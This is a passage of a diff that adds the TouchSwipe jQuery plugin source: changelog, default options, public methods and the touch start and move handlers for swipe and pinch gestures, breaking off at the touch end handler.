@@ -1,0 +1,957 @@
+/*!
+ * @fileOverview TouchSwipe - jQuery Plugin
+ * @version 1.6.18
+ *
+ * @author Matt Bryson http://www.github.com/mattbryson
+ * @see https://github.com/mattbryson/TouchSwipe-Jquery-Plugin
+ * @see http://labs.rampinteractive.co.uk/touchSwipe/
+ * @see http://plugins.jquery.com/project/touchSwipe
+ * @license
+ * Copyright (c) 2010-2015 Matt Bryson
+ * Dual licensed under the MIT or GPL Version 2 licenses.
+ *
+ */
+
+/*
+ *
+ * Changelog
+ * $Date: 2010-12-12 (Wed, 12 Dec 2010) $
+ * $version: 1.0.0
+ * $version: 1.0.1 - removed multibyte comments
+ *
+ * $Date: 2011-21-02 (Mon, 21 Feb 2011) $
+ * $version: 1.1.0 	- added allowPageScroll property to allow swiping and scrolling of page
+ *					- changed handler signatures so one handler can be used for multiple events
+ * $Date: 2011-23-02 (Wed, 23 Feb 2011) $
+ * $version: 1.2.0 	- added click handler. This is fired if the user simply clicks and does not swipe. The event object and click target are passed to handler.
+ *					- If you use the http://code.google.com/p/jquery-ui-for-ipad-and-iphone/ plugin, you can also assign jQuery mouse events to children of a touchSwipe object.
+ * $version: 1.2.1 	- removed console log!
+ *
+ * $version: 1.2.2 	- Fixed bug where scope was not preserved in callback methods.
+ *
+ * $Date: 2011-28-04 (Thurs, 28 April 2011) $
+ * $version: 1.2.4 	- Changed licence terms to be MIT or GPL inline with jQuery. Added check for support of touch events to stop non compatible browsers erroring.
+ *
+ * $Date: 2011-27-09 (Tues, 27 September 2011) $
+ * $version: 1.2.5 	- Added support for testing swipes with mouse on desktop browser (thanks to https://github.com/joelhy)
+ *
+ * $Date: 2012-14-05 (Mon, 14 May 2012) $
+ * $version: 1.2.6 	- Added timeThreshold between start and end touch, so user can ignore slow swipes (thanks to Mark Chase). Default is null, all swipes are detected
+ *
+ * $Date: 2012-05-06 (Tues, 05 June 2012) $
+ * $version: 1.2.7 	- Changed time threshold to have null default for backwards compatibility. Added duration param passed back in events, and refactored how time is handled.
+ *
+ * $Date: 2012-05-06 (Tues, 05 June 2012) $
+ * $version: 1.2.8 	- Added the possibility to return a value like null or false in the trigger callback. In that way we can control when the touch start/move should take effect or not (simply by returning in some cases return null; or return false;) This effects the ontouchstart/ontouchmove event.
+ *
+ * $Date: 2012-06-06 (Wed, 06 June 2012) $
+ * $version: 1.3.0 	- Refactored whole plugin to allow for methods to be executed, as well as exposed defaults for user override. Added 'enable', 'disable', and 'destroy' methods
+ *
+ * $Date: 2012-05-06 (Fri, 05 June 2012) $
+ * $version: 1.3.1 	- Bug fixes  - bind() with false as last argument is no longer supported in jQuery 1.6, also, if you just click, the duration is now returned correctly.
+ *
+ * $Date: 2012-29-07 (Sun, 29 July 2012) $
+ * $version: 1.3.2	- Added fallbackToMouseEvents option to NOT capture mouse events on non touch devices.
+ * 			- Added "all" fingers value to the fingers property, so any combination of fingers triggers the swipe, allowing event handlers to check the finger count
+ *
+ * $Date: 2012-09-08 (Thurs, 9 Aug 2012) $
+ * $version: 1.3.3	- Code tidy prep for minefied version
+ *
+ * $Date: 2012-04-10 (wed, 4 Oct 2012) $
+ * $version: 1.4.0	- Added pinch support, pinchIn and pinchOut
+ *
+ * $Date: 2012-11-10 (Thurs, 11 Oct 2012) $
+ * $version: 1.5.0	- Added excludedElements, a jquery selector that specifies child elements that do NOT trigger swipes. By default, this is .noSwipe
+ *
+ * $Date: 2012-22-10 (Mon, 22 Oct 2012) $
+ * $version: 1.5.1	- Fixed bug with jQuery 1.8 and trailing comma in excludedElements
+ *					- Fixed bug with IE and eventPreventDefault()
+ * $Date: 2013-01-12 (Fri, 12 Jan 2013) $
+ * $version: 1.6.0	- Fixed bugs with pinching, mainly when both pinch and swipe enabled, as well as adding time threshold for multifinger gestures, so releasing one finger beofre the other doesnt trigger as single finger gesture.
+ *					- made the demo site all static local HTML pages so they can be run locally by a developer
+ *					- added jsDoc comments and added documentation for the plugin
+ *					- code tidy
+ *					- added triggerOnTouchLeave property that will end the event when the user swipes off the element.
+ * $Date: 2013-03-23 (Sat, 23 Mar 2013) $
+ * $version: 1.6.1	- Added support for ie8 touch events
+ * $version: 1.6.2	- Added support for events binding with on / off / bind in jQ for all callback names.
+ *                   - Deprecated the 'click' handler in favour of tap.
+ *                   - added cancelThreshold property
+ *                   - added option method to update init options at runtime
+ * $version 1.6.3    - added doubletap, longtap events and longTapThreshold, doubleTapThreshold property
+ *
+ * $Date: 2013-04-04 (Thurs, 04 April 2013) $
+ * $version 1.6.4    - Fixed bug with cancelThreshold introduced in 1.6.3, where swipe status no longer fired start event, and stopped once swiping back.
+ *
+ * $Date: 2013-08-24 (Sat, 24 Aug 2013) $
+ * $version 1.6.5    - Merged a few pull requests fixing various bugs, added AMD support.
+ *
+ * $Date: 2014-06-04 (Wed, 04 June 2014) $
+ * $version 1.6.6 	- Merge of pull requests.
+ *    				- IE10 touch support
+ *    				- Only prevent default event handling on valid swipe
+ *    				- Separate license/changelog comment
+ *    				- Detect if the swipe is valid at the end of the touch event.
+ *    				- Pass fingerdata to event handlers.
+ *    				- Add 'hold' gesture
+ *    				- Be more tolerant about the tap distance
+ *    				- Typos and minor fixes
+ *
+ * $Date: 2015-22-01 (Thurs, 22 Jan 2015) $
+ * $version 1.6.7    - Added patch from https://github.com/mattbryson/TouchSwipe-Jquery-Plugin/issues/206 to fix memory leak
+ *
+ * $Date: 2015-2-2 (Mon, 2 Feb 2015) $
+ * $version 1.6.8    - Added preventDefaultEvents option to proxy events regardless.
+ *					- Fixed issue with swipe and pinch not triggering at the same time
+ *
+ * $Date: 2015-9-6 (Tues, 9 June 2015) $
+ * $version 1.6.9    - Added PR from jdalton/hybrid to fix pointer events
+ *					- Added scrolling demo
+ *					- Added version property to plugin
+ *
+ * $Date: 2015-1-10 (Wed, 1 October 2015) $
+ * $version 1.6.10    - Added PR from beatspace to fix tap events
+ * $version 1.6.11    - Added PRs from indri-indri ( Doc tidyup), kkirsche ( Bower tidy up ), UziTech (preventDefaultEvents fixes )
+ *					 - Allowed setting multiple options via .swipe("options", options_hash) and more simply .swipe(options_hash) or exisitng instances
+ * $version 1.6.12    - Fixed bug with multi finger releases above 2 not triggering events
+ *
+ * $Date: 2015-12-18 (Fri, 18 December 2015) $
+ * $version 1.6.13    - Added PRs
+ *                    - Fixed #267 allowPageScroll not working correctly
+ * $version 1.6.14    - Fixed #220 / #248 doubletap not firing with swipes, #223 commonJS compatible
+ * $version 1.6.15    - More bug fixes
+ *
+ * $Date: 2016-04-29 (Fri, 29 April 2016) $
+ * $version 1.6.16    - Swipes with 0 distance now allow default events to trigger.  So tapping any form elements or A tags will allow default interaction, but swiping will trigger a swipe.
+                        Removed the a, input, select etc from the excluded Children list as the 0 distance tap solves that issue.
+* $Date: 2016-05-19  (Fri, 29 April 2016) $
+* $version 1.6.17     - Fixed context issue when calling instance methods via $("selector").swipe("method");
+* $version 1.6.18     - now honors fallbackToMouseEvents=false for MS Pointer events when a Mouse is used.
+
+ */
+
+/**
+ * See (http://jquery.com/).
+ * @name $
+ * @class
+ * See the jQuery Library  (http://jquery.com/) for full details.  This just
+ * documents the function and classes that are added to jQuery by this plug-in.
+ */
+
+/**
+ * See (http://jquery.com/)
+ * @name fn
+ * @class
+ * See the jQuery Library  (http://jquery.com/) for full details.  This just
+ * documents the function and classes that are added to jQuery by this plug-in.
+ * @memberOf $
+ */
+
+
+(function(factory) {
+  if (typeof define === 'function' && define.amd && define.amd.jQuery) {
+    // AMD. Register as anonymous module.
+    define(['jquery'], factory);
+  } else if (typeof module !== 'undefined' && module.exports) {
+    // CommonJS Module
+    factory(require("jquery"));
+  } else {
+    // Browser globals.
+    factory(jQuery);
+  }
+}(function($) {
+  "use strict";
+
+  //Constants
+  var VERSION = "1.6.18",
+    LEFT = "left",
+    RIGHT = "right",
+    UP = "up",
+    DOWN = "down",
+    IN = "in",
+    OUT = "out",
+
+    NONE = "none",
+    AUTO = "auto",
+
+    SWIPE = "swipe",
+    PINCH = "pinch",
+    TAP = "tap",
+    DOUBLE_TAP = "doubletap",
+    LONG_TAP = "longtap",
+    HOLD = "hold",
+
+    HORIZONTAL = "horizontal",
+    VERTICAL = "vertical",
+
+    ALL_FINGERS = "all",
+
+    DOUBLE_TAP_THRESHOLD = 10,
+
+    PHASE_START = "start",
+    PHASE_MOVE = "move",
+    PHASE_END = "end",
+    PHASE_CANCEL = "cancel",
+
+    SUPPORTS_TOUCH = 'ontouchstart' in window,
+
+    SUPPORTS_POINTER_IE10 = window.navigator.msPointerEnabled && !window.navigator.pointerEnabled && !SUPPORTS_TOUCH,
+
+    SUPPORTS_POINTER = (window.navigator.pointerEnabled || window.navigator.msPointerEnabled) && !SUPPORTS_TOUCH,
+
+    PLUGIN_NS = 'TouchSwipe';
+
+
+
+  /**
+  * The default configuration, and available options to configure touch swipe with.
+  * You can set the default values by updating any of the properties prior to instantiation.
+  * @name $.fn.swipe.defaults
+  * @namespace
+  * @property {int} [fingers=1] The number of fingers to detect in a swipe. Any swipes that do not meet this requirement will NOT trigger swipe handlers.
+  * @property {int} [threshold=75] The number of pixels that the user must move their finger by before it is considered a swipe.
+  * @property {int} [cancelThreshold=null] The number of pixels that the user must move their finger back from the original swipe direction to cancel the gesture.
+  * @property {int} [pinchThreshold=20] The number of pixels that the user must pinch their finger by before it is considered a pinch.
+  * @property {int} [maxTimeThreshold=null] Time, in milliseconds, between touchStart and touchEnd must NOT exceed in order to be considered a swipe.
+  * @property {int} [fingerReleaseThreshold=250] Time in milliseconds between releasing multiple fingers.  If 2 fingers are down, and are released one after the other, if they are within this threshold, it counts as a simultaneous release.
+  * @property {int} [longTapThreshold=500] Time in milliseconds between tap and release for a long tap
+  * @property {int} [doubleTapThreshold=200] Time in milliseconds between 2 taps to count as a double tap
+  * @property {function} [swipe=null] A handler to catch all swipes. See {@link $.fn.swipe#event:swipe}
+  * @property {function} [swipeLeft=null] A handler that is triggered for "left" swipes. See {@link $.fn.swipe#event:swipeLeft}
+  * @property {function} [swipeRight=null] A handler that is triggered for "right" swipes. See {@link $.fn.swipe#event:swipeRight}
+  * @property {function} [swipeUp=null] A handler that is triggered for "up" swipes. See {@link $.fn.swipe#event:swipeUp}
+  * @property {function} [swipeDown=null] A handler that is triggered for "down" swipes. See {@link $.fn.swipe#event:swipeDown}
+  * @property {function} [swipeStatus=null] A handler triggered for every phase of the swipe. See {@link $.fn.swipe#event:swipeStatus}
+  * @property {function} [pinchIn=null] A handler triggered for pinch in events. See {@link $.fn.swipe#event:pinchIn}
+  * @property {function} [pinchOut=null] A handler triggered for pinch out events. See {@link $.fn.swipe#event:pinchOut}
+  * @property {function} [pinchStatus=null] A handler triggered for every phase of a pinch. See {@link $.fn.swipe#event:pinchStatus}
+  * @property {function} [tap=null] A handler triggered when a user just taps on the item, rather than swipes it. If they do not move, tap is triggered, if they do move, it is not.
+  * @property {function} [doubleTap=null] A handler triggered when a user double taps on the item. The delay between taps can be set with the doubleTapThreshold property. See {@link $.fn.swipe.defaults#doubleTapThreshold}
+  * @property {function} [longTap=null] A handler triggered when a user long taps on the item. The delay between start and end can be set with the longTapThreshold property. See {@link $.fn.swipe.defaults#longTapThreshold}
+  * @property (function) [hold=null] A handler triggered when a user reaches longTapThreshold on the item. See {@link $.fn.swipe.defaults#longTapThreshold}
+  * @property {boolean} [triggerOnTouchEnd=true] If true, the swipe events are triggered when the touch end event is received (user releases finger).  If false, it will be triggered on reaching the threshold, and then cancel the touch event automatically.
+  * @property {boolean} [triggerOnTouchLeave=false] If true, then when the user leaves the swipe object, the swipe will end and trigger appropriate handlers.
+  * @property {string|undefined} [allowPageScroll='auto'] How the browser handles page scrolls when the user is swiping on a touchSwipe object. See {@link $.fn.swipe.pageScroll}.  <br/><br/>
+  									<code>"auto"</code> : all undefined swipes will cause the page to scroll in that direction. <br/>
+  									<code>"none"</code> : the page will not scroll when user swipes. <br/>
+  									<code>"horizontal"</code> : will force page to scroll on horizontal swipes. <br/>
+  									<code>"vertical"</code> : will force page to scroll on vertical swipes. <br/>
+  * @property {boolean} [fallbackToMouseEvents=true] If true mouse events are used when run on a non touch device, false will stop swipes being triggered by mouse events on non touch devices.
+  * @property {string} [excludedElements=".noSwipe"] A jquery selector that specifies child elements that do NOT trigger swipes. By default this excludes elements with the class .noSwipe .
+  * @property {boolean} [preventDefaultEvents=true] by default default events are cancelled, so the page doesn't move.  You can disable this so both native events fire as well as your handlers.
+
+  */
+  var defaults = {
+    fingers: 1,
+    threshold: 75,
+    cancelThreshold: null,
+    pinchThreshold: 20,
+    maxTimeThreshold: null,
+    fingerReleaseThreshold: 250,
+    longTapThreshold: 500,
+    doubleTapThreshold: 200,
+    swipe: null,
+    swipeLeft: null,
+    swipeRight: null,
+    swipeUp: null,
+    swipeDown: null,
+    swipeStatus: null,
+    pinchIn: null,
+    pinchOut: null,
+    pinchStatus: null,
+    click: null, //Deprecated since 1.6.2
+    tap: null,
+    doubleTap: null,
+    longTap: null,
+    hold: null,
+    triggerOnTouchEnd: true,
+    triggerOnTouchLeave: false,
+    allowPageScroll: "auto",
+    fallbackToMouseEvents: true,
+    excludedElements: ".noSwipe",
+    preventDefaultEvents: true
+  };
+
+
+
+  /**
+   * Applies TouchSwipe behaviour to one or more jQuery objects.
+   * The TouchSwipe plugin can be instantiated via this method, or methods within
+   * TouchSwipe can be executed via this method as per jQuery plugin architecture.
+   * An existing plugin can have its options changed simply by re calling .swipe(options)
+   * @see TouchSwipe
+   * @class
+   * @param {Mixed} method If the current DOMNode is a TouchSwipe object, and <code>method</code> is a TouchSwipe method, then
+   * the <code>method</code> is executed, and any following arguments are passed to the TouchSwipe method.
+   * If <code>method</code> is an object, then the TouchSwipe class is instantiated on the current DOMNode, passing the
+   * configuration properties defined in the object. See TouchSwipe
+   *
+   */
+  $.fn.swipe = function(method) {
+    var $this = $(this),
+      plugin = $this.data(PLUGIN_NS);
+
+    //Check if we are already instantiated and trying to execute a method
+    if (plugin && typeof method === 'string') {
+      if (plugin[method]) {
+        return plugin[method].apply(plugin, Array.prototype.slice.call(arguments, 1));
+      } else {
+        $.error('Method ' + method + ' does not exist on jQuery.swipe');
+      }
+    }
+
+    //Else update existing plugin with new options hash
+    else if (plugin && typeof method === 'object') {
+      plugin['option'].apply(plugin, arguments);
+    }
+
+    //Else not instantiated and trying to pass init object (or nothing)
+    else if (!plugin && (typeof method === 'object' || !method)) {
+      return init.apply(this, arguments);
+    }
+
+    return $this;
+  };
+
+  /**
+   * The version of the plugin
+   * @readonly
+   */
+  $.fn.swipe.version = VERSION;
+
+
+
+  //Expose our defaults so a user could override the plugin defaults
+  $.fn.swipe.defaults = defaults;
+
+  /**
+   * The phases that a touch event goes through.  The <code>phase</code> is passed to the event handlers.
+   * These properties are read only, attempting to change them will not alter the values passed to the event handlers.
+   * @namespace
+   * @readonly
+   * @property {string} PHASE_START Constant indicating the start phase of the touch event. Value is <code>"start"</code>.
+   * @property {string} PHASE_MOVE Constant indicating the move phase of the touch event. Value is <code>"move"</code>.
+   * @property {string} PHASE_END Constant indicating the end phase of the touch event. Value is <code>"end"</code>.
+   * @property {string} PHASE_CANCEL Constant indicating the cancel phase of the touch event. Value is <code>"cancel"</code>.
+   */
+  $.fn.swipe.phases = {
+    PHASE_START: PHASE_START,
+    PHASE_MOVE: PHASE_MOVE,
+    PHASE_END: PHASE_END,
+    PHASE_CANCEL: PHASE_CANCEL
+  };
+
+  /**
+   * The direction constants that are passed to the event handlers.
+   * These properties are read only, attempting to change them will not alter the values passed to the event handlers.
+   * @namespace
+   * @readonly
+   * @property {string} LEFT Constant indicating the left direction. Value is <code>"left"</code>.
+   * @property {string} RIGHT Constant indicating the right direction. Value is <code>"right"</code>.
+   * @property {string} UP Constant indicating the up direction. Value is <code>"up"</code>.
+   * @property {string} DOWN Constant indicating the down direction. Value is <code>"cancel"</code>.
+   * @property {string} IN Constant indicating the in direction. Value is <code>"in"</code>.
+   * @property {string} OUT Constant indicating the out direction. Value is <code>"out"</code>.
+   */
+  $.fn.swipe.directions = {
+    LEFT: LEFT,
+    RIGHT: RIGHT,
+    UP: UP,
+    DOWN: DOWN,
+    IN: IN,
+    OUT: OUT
+  };
+
+  /**
+   * The page scroll constants that can be used to set the value of <code>allowPageScroll</code> option
+   * These properties are read only
+   * @namespace
+   * @readonly
+   * @see $.fn.swipe.defaults#allowPageScroll
+   * @property {string} NONE Constant indicating no page scrolling is allowed. Value is <code>"none"</code>.
+   * @property {string} HORIZONTAL Constant indicating horizontal page scrolling is allowed. Value is <code>"horizontal"</code>.
+   * @property {string} VERTICAL Constant indicating vertical page scrolling is allowed. Value is <code>"vertical"</code>.
+   * @property {string} AUTO Constant indicating either horizontal or vertical will be allowed, depending on the swipe handlers registered. Value is <code>"auto"</code>.
+   */
+  $.fn.swipe.pageScroll = {
+    NONE: NONE,
+    HORIZONTAL: HORIZONTAL,
+    VERTICAL: VERTICAL,
+    AUTO: AUTO
+  };
+
+  /**
+   * Constants representing the number of fingers used in a swipe.  These are used to set both the value of <code>fingers</code> in the
+   * options object, as well as the value of the <code>fingers</code> event property.
+   * These properties are read only, attempting to change them will not alter the values passed to the event handlers.
+   * @namespace
+   * @readonly
+   * @see $.fn.swipe.defaults#fingers
+   * @property {string} ONE Constant indicating 1 finger is to be detected / was detected. Value is <code>1</code>.
+   * @property {string} TWO Constant indicating 2 fingers are to be detected / were detected. Value is <code>2</code>.
+   * @property {string} THREE Constant indicating 3 finger are to be detected / were detected. Value is <code>3</code>.
+   * @property {string} FOUR Constant indicating 4 finger are to be detected / were detected. Not all devices support this. Value is <code>4</code>.
+   * @property {string} FIVE Constant indicating 5 finger are to be detected / were detected. Not all devices support this. Value is <code>5</code>.
+   * @property {string} ALL Constant indicating any combination of finger are to be detected.  Value is <code>"all"</code>.
+   */
+  $.fn.swipe.fingers = {
+    ONE: 1,
+    TWO: 2,
+    THREE: 3,
+    FOUR: 4,
+    FIVE: 5,
+    ALL: ALL_FINGERS
+  };
+
+  /**
+   * Initialise the plugin for each DOM element matched
+   * This creates a new instance of the main TouchSwipe class for each DOM element, and then
+   * saves a reference to that instance in the elements data property.
+   * @internal
+   */
+  function init(options) {
+    //Prep and extend the options
+    if (options && (options.allowPageScroll === undefined && (options.swipe !== undefined || options.swipeStatus !== undefined))) {
+      options.allowPageScroll = NONE;
+    }
+
+    //Check for deprecated options
+    //Ensure that any old click handlers are assigned to the new tap, unless we have a tap
+    if (options.click !== undefined && options.tap === undefined) {
+      options.tap = options.click;
+    }
+
+    if (!options) {
+      options = {};
+    }
+
+    //pass empty object so we dont modify the defaults
+    options = $.extend({}, $.fn.swipe.defaults, options);
+
+    //For each element instantiate the plugin
+    return this.each(function() {
+      var $this = $(this);
+
+      //Check we havent already initialised the plugin
+      var plugin = $this.data(PLUGIN_NS);
+
+      if (!plugin) {
+        plugin = new TouchSwipe(this, options);
+        $this.data(PLUGIN_NS, plugin);
+      }
+    });
+  }
+
+  /**
+   * Main TouchSwipe Plugin Class.
+   * Do not use this to construct your TouchSwipe object, use the jQuery plugin method $.fn.swipe(); {@link $.fn.swipe}
+   * @private
+   * @name TouchSwipe
+   * @param {DOMNode} element The HTML DOM object to apply to plugin to
+   * @param {Object} options The options to configure the plugin with.  @link {$.fn.swipe.defaults}
+   * @see $.fh.swipe.defaults
+   * @see $.fh.swipe
+   * @class
+   */
+  function TouchSwipe(element, options) {
+
+    //take a local/instacne level copy of the options - should make it this.options really...
+    var options = $.extend({}, options);
+
+    var useTouchEvents = (SUPPORTS_TOUCH || SUPPORTS_POINTER || !options.fallbackToMouseEvents),
+      START_EV = useTouchEvents ? (SUPPORTS_POINTER ? (SUPPORTS_POINTER_IE10 ? 'MSPointerDown' : 'pointerdown') : 'touchstart') : 'mousedown',
+      MOVE_EV = useTouchEvents ? (SUPPORTS_POINTER ? (SUPPORTS_POINTER_IE10 ? 'MSPointerMove' : 'pointermove') : 'touchmove') : 'mousemove',
+      END_EV = useTouchEvents ? (SUPPORTS_POINTER ? (SUPPORTS_POINTER_IE10 ? 'MSPointerUp' : 'pointerup') : 'touchend') : 'mouseup',
+      LEAVE_EV = useTouchEvents ? (SUPPORTS_POINTER ? 'mouseleave' : null) : 'mouseleave', //we manually detect leave on touch devices, so null event here
+      CANCEL_EV = (SUPPORTS_POINTER ? (SUPPORTS_POINTER_IE10 ? 'MSPointerCancel' : 'pointercancel') : 'touchcancel');
+
+
+
+    //touch properties
+    var distance = 0,
+      direction = null,
+      currentDirection = null,
+      duration = 0,
+      startTouchesDistance = 0,
+      endTouchesDistance = 0,
+      pinchZoom = 1,
+      pinchDistance = 0,
+      pinchDirection = 0,
+      maximumsMap = null;
+
+
+
+    //jQuery wrapped element for this instance
+    var $element = $(element);
+
+    //Current phase of th touch cycle
+    var phase = "start";
+
+    // the current number of fingers being used.
+    var fingerCount = 0;
+
+    //track mouse points / delta
+    var fingerData = {};
+
+    //track times
+    var startTime = 0,
+      endTime = 0,
+      previousTouchEndTime = 0,
+      fingerCountAtRelease = 0,
+      doubleTapStartTime = 0;
+
+    //Timeouts
+    var singleTapTimeout = null,
+      holdTimeout = null;
+
+    // Add gestures to all swipable areas if supported
+    try {
+      $element.bind(START_EV, touchStart);
+      $element.bind(CANCEL_EV, touchCancel);
+    } catch (e) {
+      $.error('events not supported ' + START_EV + ',' + CANCEL_EV + ' on jQuery.swipe');
+    }
+
+    //
+    //Public methods
+    //
+
+    /**
+     * re-enables the swipe plugin with the previous configuration
+     * @function
+     * @name $.fn.swipe#enable
+     * @return {DOMNode} The Dom element that was registered with TouchSwipe
+     * @example $("#element").swipe("enable");
+     */
+    this.enable = function() {
+      //Incase we are already enabled, clean up...
+      this.disable();
+      $element.bind(START_EV, touchStart);
+      $element.bind(CANCEL_EV, touchCancel);
+      return $element;
+    };
+
+    /**
+     * disables the swipe plugin
+     * @function
+     * @name $.fn.swipe#disable
+     * @return {DOMNode} The Dom element that is now registered with TouchSwipe
+     * @example $("#element").swipe("disable");
+     */
+    this.disable = function() {
+      removeListeners();
+      return $element;
+    };
+
+    /**
+     * Destroy the swipe plugin completely. To use any swipe methods, you must re initialise the plugin.
+     * @function
+     * @name $.fn.swipe#destroy
+     * @example $("#element").swipe("destroy");
+     */
+    this.destroy = function() {
+      removeListeners();
+      $element.data(PLUGIN_NS, null);
+      $element = null;
+    };
+
+
+    /**
+     * Allows run time updating of the swipe configuration options.
+     * @function
+     * @name $.fn.swipe#option
+     * @param {String} property The option property to get or set, or a has of multiple options to set
+     * @param {Object} [value] The value to set the property to
+     * @return {Object} If only a property name is passed, then that property value is returned. If nothing is passed the current options hash is returned.
+     * @example $("#element").swipe("option", "threshold"); // return the threshold
+     * @example $("#element").swipe("option", "threshold", 100); // set the threshold after init
+     * @example $("#element").swipe("option", {threshold:100, fingers:3} ); // set multiple properties after init
+     * @example $("#element").swipe({threshold:100, fingers:3} ); // set multiple properties after init - the "option" method is optional!
+     * @example $("#element").swipe("option"); // Return the current options hash
+     * @see $.fn.swipe.defaults
+     *
+     */
+    this.option = function(property, value) {
+
+      if (typeof property === 'object') {
+        options = $.extend(options, property);
+      } else if (options[property] !== undefined) {
+        if (value === undefined) {
+          return options[property];
+        } else {
+          options[property] = value;
+        }
+      } else if (!property) {
+        return options;
+      } else {
+        $.error('Option ' + property + ' does not exist on jQuery.swipe.options');
+      }
+
+      return null;
+    }
+
+
+
+    //
+    // Private methods
+    //
+
+    //
+    // EVENTS
+    //
+    /**
+     * Event handler for a touch start event.
+     * Stops the default click event from triggering and stores where we touched
+     * @inner
+     * @param {object} jqEvent The normalised jQuery event object.
+     */
+    function touchStart(jqEvent) {
+
+      //If we already in a touch event (a finger already in use) then ignore subsequent ones..
+      if (getTouchInProgress()) {
+        return;
+      }
+
+      //Check if this element matches any in the excluded elements selectors,  or its parent is excluded, if so, DON'T swipe
+      if ($(jqEvent.target).closest(options.excludedElements, $element).length > 0) {
+        return;
+      }
+
+      //As we use Jquery bind for events, we need to target the original event object
+      //If these events are being programmatically triggered, we don't have an original event object, so use the Jq one.
+      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent;
+
+
+      //If we have a pointer event, whoes type is 'mouse' and we have said NO mouse events, then dont do anything.
+      if(event.pointerType && event.pointerType=="mouse" && options.fallbackToMouseEvents==false) {
+        return;
+      };
+
+      var ret,
+        touches = event.touches,
+        evt = touches ? touches[0] : event;
+
+      phase = PHASE_START;
+
+      //If we support touches, get the finger count
+      if (touches) {
+        // get the total number of fingers touching the screen
+        fingerCount = touches.length;
+      }
+      //Else this is the desktop, so stop the browser from dragging content
+      else if (options.preventDefaultEvents !== false) {
+        jqEvent.preventDefault(); //call this on jq event so we are cross browser
+      }
+
+      //clear vars..
+      distance = 0;
+      direction = null;
+      currentDirection=null;
+      pinchDirection = null;
+      duration = 0;
+      startTouchesDistance = 0;
+      endTouchesDistance = 0;
+      pinchZoom = 1;
+      pinchDistance = 0;
+      maximumsMap = createMaximumsData();
+      cancelMultiFingerRelease();
+
+      //Create the default finger data
+      createFingerData(0, evt);
+
+      // check the number of fingers is what we are looking for, or we are capturing pinches
+      if (!touches || (fingerCount === options.fingers || options.fingers === ALL_FINGERS) || hasPinches()) {
+        // get the coordinates of the touch
+        startTime = getTimeStamp();
+
+        if (fingerCount == 2) {
+          //Keep track of the initial pinch distance, so we can calculate the diff later
+          //Store second finger data as start
+          createFingerData(1, touches[1]);
+          startTouchesDistance = endTouchesDistance = calculateTouchesDistance(fingerData[0].start, fingerData[1].start);
+        }
+
+        if (options.swipeStatus || options.pinchStatus) {
+          ret = triggerHandler(event, phase);
+        }
+      } else {
+        //A touch with more or less than the fingers we are looking for, so cancel
+        ret = false;
+      }
+
+      //If we have a return value from the users handler, then return and cancel
+      if (ret === false) {
+        phase = PHASE_CANCEL;
+        triggerHandler(event, phase);
+        return ret;
+      } else {
+        if (options.hold) {
+          holdTimeout = setTimeout($.proxy(function() {
+            //Trigger the event
+            $element.trigger('hold', [event.target]);
+            //Fire the callback
+            if (options.hold) {
+              ret = options.hold.call($element, event, event.target);
+            }
+          }, this), options.longTapThreshold);
+        }
+
+        setTouchInProgress(true);
+      }
+
+      return null;
+    };
+
+
+
+    /**
+     * Event handler for a touch move event.
+     * If we change fingers during move, then cancel the event
+     * @inner
+     * @param {object} jqEvent The normalised jQuery event object.
+     */
+    function touchMove(jqEvent) {
+
+      //As we use Jquery bind for events, we need to target the original event object
+      //If these events are being programmatically triggered, we don't have an original event object, so use the Jq one.
+      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent;
+
+      //If we are ending, cancelling, or within the threshold of 2 fingers being released, don't track anything..
+      if (phase === PHASE_END || phase === PHASE_CANCEL || inMultiFingerRelease())
+        return;
+
+      var ret,
+        touches = event.touches,
+        evt = touches ? touches[0] : event;
+
+
+      //Update the  finger data
+      var currentFinger = updateFingerData(evt);
+      endTime = getTimeStamp();
+
+      if (touches) {
+        fingerCount = touches.length;
+      }
+
+      if (options.hold) {
+        clearTimeout(holdTimeout);
+      }
+
+      phase = PHASE_MOVE;
+
+      //If we have 2 fingers get Touches distance as well
+      if (fingerCount == 2) {
+
+        //Keep track of the initial pinch distance, so we can calculate the diff later
+        //We do this here as well as the start event, in case they start with 1 finger, and the press 2 fingers
+        if (startTouchesDistance == 0) {
+          //Create second finger if this is the first time...
+          createFingerData(1, touches[1]);
+
+          startTouchesDistance = endTouchesDistance = calculateTouchesDistance(fingerData[0].start, fingerData[1].start);
+        } else {
+          //Else just update the second finger
+          updateFingerData(touches[1]);
+
+          endTouchesDistance = calculateTouchesDistance(fingerData[0].end, fingerData[1].end);
+          pinchDirection = calculatePinchDirection(fingerData[0].end, fingerData[1].end);
+        }
+
+        pinchZoom = calculatePinchZoom(startTouchesDistance, endTouchesDistance);
+        pinchDistance = Math.abs(startTouchesDistance - endTouchesDistance);
+      }
+
+      if ((fingerCount === options.fingers || options.fingers === ALL_FINGERS) || !touches || hasPinches()) {
+
+        //The overall direction of the swipe. From start to now.
+        direction = calculateDirection(currentFinger.start, currentFinger.end);
+
+        //The immediate direction of the swipe, direction between the last movement and this one.
+        currentDirection = calculateDirection(currentFinger.last, currentFinger.end);
+
+        //Check if we need to prevent default event (page scroll / pinch zoom) or not
+        validateDefaultEvent(jqEvent, currentDirection);
+
+        //Distance and duration are all off the main finger
+        distance = calculateDistance(currentFinger.start, currentFinger.end);
+        duration = calculateDuration();
+
+        //Cache the maximum distance we made in this direction
+        setMaxDistance(direction, distance);
+
+        //Trigger status handler
+        ret = triggerHandler(event, phase);
+
+
+        //If we trigger end events when threshold are met, or trigger events when touch leaves element
+        if (!options.triggerOnTouchEnd || options.triggerOnTouchLeave) {
+
+          var inBounds = true;
+
+          //If checking if we leave the element, run the bounds check (we can use touchleave as its not supported on webkit)
+          if (options.triggerOnTouchLeave) {
+            var bounds = getbounds(this);
+            inBounds = isInBounds(currentFinger.end, bounds);
+          }
+
+          //Trigger end handles as we swipe if thresholds met or if we have left the element if the user has asked to check these..
+          if (!options.triggerOnTouchEnd && inBounds) {
+            phase = getNextPhase(PHASE_MOVE);
+          }
+          //We end if out of bounds here, so set current phase to END, and check if its modified
+          else if (options.triggerOnTouchLeave && !inBounds) {
+            phase = getNextPhase(PHASE_END);
+          }
+
+          if (phase == PHASE_CANCEL || phase == PHASE_END) {
+            triggerHandler(event, phase);
+          }
+        }
+      } else {
+        phase = PHASE_CANCEL;
+        triggerHandler(event, phase);
+      }
+
+      if (ret === false) {
+        phase = PHASE_CANCEL;
+        triggerHandler(event, phase);
+      }
+    }
+
+
+
+
+    /**
+     * Event handler for a touch end event.
+     * Calculate the direction and trigger events
+     * @inner
